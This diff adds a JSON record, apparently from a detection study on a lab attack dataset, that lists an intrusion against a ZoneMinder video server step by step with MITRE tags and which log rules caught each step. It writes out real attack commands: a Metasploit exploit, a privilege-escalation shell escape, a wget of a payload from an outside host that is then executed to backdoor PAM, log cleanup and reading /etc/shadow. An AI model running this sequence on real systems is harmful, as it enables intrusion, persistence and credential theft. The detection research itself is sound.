@@ -1,0 +1,322 @@
+{
+ "scenario": "scenario_1_sudo_pam",
+ "victim": "videoserver",
+ "n_events": 26411,
+ "files": [
+  {
+   "file": "<CAM-LDS>/s1/scenario_1_sudo_pam/videoserver/logs/access.log",
+   "kind": "access",
+   "events": 0
+  },
+  {
+   "file": "<CAM-LDS>/s1/scenario_1_sudo_pam/videoserver/logs/access.log.1",
+   "kind": "access",
+   "events": 24773
+  },
+  {
+   "file": "<CAM-LDS>/s1/scenario_1_sudo_pam/videoserver/logs/log/apache2/access.log",
+   "kind": "access",
+   "events": 0
+  },
+  {
+   "file": "<CAM-LDS>/s1/scenario_1_sudo_pam/videoserver/logs/log/apache2/other_vhosts_access.log",
+   "kind": "access",
+   "events": 0
+  },
+  {
+   "file": "<CAM-LDS>/s1/scenario_1_sudo_pam/videoserver/logs/error.log",
+   "kind": "weberror",
+   "events": 0
+  },
+  {
+   "file": "<CAM-LDS>/s1/scenario_1_sudo_pam/videoserver/logs/error.log.1",
+   "kind": "weberror",
+   "events": 1618
+  },
+  {
+   "file": "<CAM-LDS>/s1/scenario_1_sudo_pam/videoserver/logs/log/auth.log",
+   "kind": "auth",
+   "events": 20
+  }
+ ],
+ "steps": [
+  {
+   "ts": "2025-09-22T13:48:45+00:00",
+   "kind": "Shell-Command",
+   "cmd": "dnsenum -f /usr/local/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --dnsserver 192.42.0.233 attackbed.co",
+   "tech": "T1590.002,T1591",
+   "tactic": "Reconnaissance",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-09-22T13:49:04+00:00",
+   "kind": "Shell-Command",
+   "cmd": "sudo nmap -O -sT --top-ports 100 video.attackbed.com",
+   "tech": "T1595,T1592.002",
+   "tactic": "Reconnaissance",
+   "rules": [
+    "WEBLOG_ENUM_404",
+    "WEBLOG_IDOR_ENUM",
+    "WEBLOG_SCANNER"
+   ],
+   "visible": true
+  },
+  {
+   "ts": "2025-09-22T13:49:32+00:00",
+   "kind": "Shell-Command",
+   "cmd": "nikto -host video.attackbed.com",
+   "tech": "T1595.002",
+   "tactic": "Reconnaissance",
+   "rules": [
+    "WEBLOG_CMD_INJECTION",
+    "WEBLOG_ENUM_404",
+    "WEBLOG_IDOR_ENUM",
+    "WEBLOG_OPEN_REDIRECT",
+    "WEBLOG_RFI",
+    "WEBLOG_SCANNER",
+    "WEBLOG_SENSITIVE_FILE",
+    "WEBLOG_SQLI",
+    "WEBLOG_TRAVERSAL",
+    "WEBLOG_UPLOAD_EXEC",
+    "WEBLOG_XSS"
+   ],
+   "visible": true
+  },
+  {
+   "ts": "2025-09-22T13:50:32+00:00",
+   "kind": "Shell-Command",
+   "cmd": "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://video.attackbed.c",
+   "tech": "T1595.003",
+   "tactic": "Reconnaissance",
+   "rules": [
+    "WEBLOG_ENUM_404",
+    "WEBLOG_IDOR_ENUM"
+   ],
+   "visible": true
+  },
+  {
+   "ts": "2025-09-22T13:52:23+00:00",
+   "kind": "Msf-Module",
+   "cmd": "exploit/unix/webapp/zoneminder_snapshots",
+   "tech": "T1190,T1059.006",
+   "tactic": "Initial Access",
+   "rules": [],
+   "visible": true
+  },
+  {
+   "ts": "2025-09-22T13:53:45+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "upload /var/www/html/linpeas.sh",
+   "tech": "T1105",
+   "tactic": "Command and Control",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-09-22T13:54:18+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";",
+   "tech": "T1059",
+   "tactic": "Execution",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-09-22T13:54:34+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "export SHELL=bash",
+   "tech": "T1059",
+   "tactic": "Execution",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-09-22T13:54:51+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "export TERM=xterm256-color",
+   "tech": "T1059",
+   "tactic": "Execution",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-09-22T13:55:07+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "stty rows 38 columns 116",
+   "tech": "T1059",
+   "tactic": "Execution",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-09-22T13:55:23+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "export PS1=\"PWN >\"",
+   "tech": "T1059",
+   "tactic": "Execution",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-09-22T13:55:40+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "chmod +x linpeas.sh",
+   "tech": "T1059",
+   "tactic": "Execution",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-09-22T13:55:56+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "./linpeas.sh -s -q -N 2> /dev/null",
+   "tech": "T1087,T1083,T1201,T1069,T1057,T1518,T1082,T1614,T1016,T1049,T1033,T1007,T1615",
+   "tactic": "Discovery",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-09-22T14:06:12+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "id",
+   "tech": "T1033",
+   "tactic": "Discovery",
+   "rules": [
+    "HOST_PRIV_ESC"
+   ],
+   "visible": true
+  },
+  {
+   "ts": "2025-09-22T14:06:28+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "sudo dmesg -H",
+   "tech": "T1548.003",
+   "tactic": "Privilege Escalation,Defense Evasion",
+   "rules": [
+    "HOST_PRIV_ESC"
+   ],
+   "visible": true
+  },
+  {
+   "ts": "2025-09-22T14:06:43+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "!/bin/bash",
+   "tech": "T1548.003",
+   "tactic": "Privilege Escalation,Defense Evasion",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-09-22T14:06:59+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "id",
+   "tech": "T1033",
+   "tactic": "Discovery",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-09-22T14:07:15+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "cd /root; wget -O README.txt http://192.42.1.174/README.txt.4",
+   "tech": "T1105",
+   "tactic": "",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-09-22T14:07:32+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "split --filter=\"cat $FILE | xargs bash -c \" -C 2000 /root/README.txt",
+   "tech": "T1218,T1556.003",
+   "tactic": "Defense Evasion,Persistence,Credential Access",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-09-22T14:07:48+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "rm /root/README.txt",
+   "tech": "T1070.004",
+   "tactic": "Defense Evasion",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-09-22T14:08:21+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "rm linpeas.sh",
+   "tech": "T1070.004",
+   "tactic": "Defense Evasion",
+   "rules": [],
+   "visible": true
+  },
+  {
+   "ts": "2025-09-22T14:09:24+00:00",
+   "kind": "SSH-Command",
+   "cmd": "id",
+   "tech": "T1033",
+   "tactic": "Discovery",
+   "rules": [
+    "HOST_PRIV_ESC"
+   ],
+   "visible": true
+  },
+  {
+   "ts": "2025-09-22T14:09:54+00:00",
+   "kind": "SSH-Command",
+   "cmd": "sudo cat /etc/shadow",
+   "tech": "T1003.008",
+   "tactic": "Credential Access",
+   "rules": [
+    "HOST_PRIV_ESC"
+   ],
+   "visible": true
+  },
+  {
+   "ts": "2025-09-22T14:10:09+00:00",
+   "kind": "SSH-Command",
+   "cmd": "sudo lspci",
+   "tech": "T1120",
+   "tactic": "Discovery",
+   "rules": [],
+   "visible": true
+  },
+  {
+   "ts": "2025-09-22T14:10:24+00:00",
+   "kind": "SSH-Command",
+   "cmd": "sudo bash -c \"command -v lsusb\"",
+   "tech": "T1120",
+   "tactic": "Discovery",
+   "rules": [],
+   "visible": true
+  },
+  {
+   "ts": "2025-09-22T14:10:39+00:00",
+   "kind": "SSH-Command",
+   "cmd": "date",
+   "tech": "T1124",
+   "tactic": "Discovery",
+   "rules": [],
+   "visible": true
+  },
+  {
+   "ts": "2025-09-22T14:10:54+00:00",
+   "kind": "SSH-Command",
+   "cmd": "sudo find /usr -name \\*virtualbox\\*",
+   "tech": "T1497.001",
+   "tactic": "Defense Evasion, Discovery",
+   "rules": [],
+   "visible": true
+  }
+ ],
+ "flag_before_attack": 0,
+ "flag_before_attack_rules": [],
+ "summary": {
+  "steps": 27,
+  "detected": 7,
+  "visible": 13,
+  "visible_detected": 7
+ }
+}
